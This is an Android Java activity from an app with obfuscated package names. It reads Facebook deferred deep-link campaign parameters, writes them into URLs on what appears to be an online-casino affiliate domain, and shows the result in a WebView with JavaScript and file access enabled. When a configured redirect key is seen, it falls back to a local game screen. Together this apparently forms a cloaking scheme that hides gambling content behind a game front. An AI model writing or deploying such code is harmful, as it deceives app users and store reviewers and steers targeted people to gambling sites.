package com.fkkjqa.fklefkwj;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.support.annotation.Nullable;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.facebook.applinks.AppLinkData;

import com.fkkjqa.fklefkwj.kektus.PageMainGame;


public class GogaScreen extends Activity {

    private String openedUrl;
    private String keyRedirect;
    private Uri uriLocal;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webgame);

        openedUrl = getString(R.string.opened_url);
        keyRedirect = getString(R.string.key_redirect);

        fetch();
    }

    @Override
    public void onStart() {
        super.onStart();
    }

    @Override
    public void onStop() {
        super.onStop();
    }


    private void fetch() {
        final Handler mainHandler = new Handler(Looper.getMainLooper());

        AppLinkData.fetchDeferredAppLinkData(this,
                appLinkData -> {
                    if (appLinkData != null) {
                        uriLocal = appLinkData.getTargetUri();
                    }
                    Runnable myRunnable = this::appear;
                    mainHandler.post(myRunnable);
                });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }


    private String uuries(Uri data, String url) {
        String transform = url;

        String QUERY_1 = "cid";
        String QUERY_2 = "partid";

        if (data.getEncodedQuery().contains(QUERY_1)) {
            String queryValueFirst = data.getQueryParameter(QUERY_1);
            transform = transform.replace(QUERY_1, queryValueFirst);
        }
        if (data.getEncodedQuery().contains(QUERY_2)) {
            String queryValueSecond = data.getQueryParameter(QUERY_2);
            transform = transform.replace(QUERY_2, queryValueSecond);
        }
        return transform;
    }

    @Override
    public void onPause() {
        super.onPause();
    }


    @SuppressLint("SetJavaScriptEnabled")
    private void appear() {
        WebView webView = findViewById(R.id.web_view);
        webView.setWebViewClient(new WebViewClient() {

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (!url.contains(keyRedirect)) {
                    if (url.contains("aff1b1b01.vulkanplat1num.net") && uriLocal != null) {
                        view.loadUrl(uuries(uriLocal, url));
                    } else {
                        view.loadUrl(url);
                    }
                } else {
                    oldGame();
                }
                return true;
            }

        });
        WebSettings webSettings = webView.getSettings();
        webSettings.setBuiltInZoomControls(true);
        webSettings.setSupportZoom(true);
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAllowFileAccess(true);
        webView.loadUrl(openedUrl);

    }

    private void oldGame() {
        Intent intent = new Intent(this, PageMainGame.class);
        startActivity(intent);
        finish();
    }
}
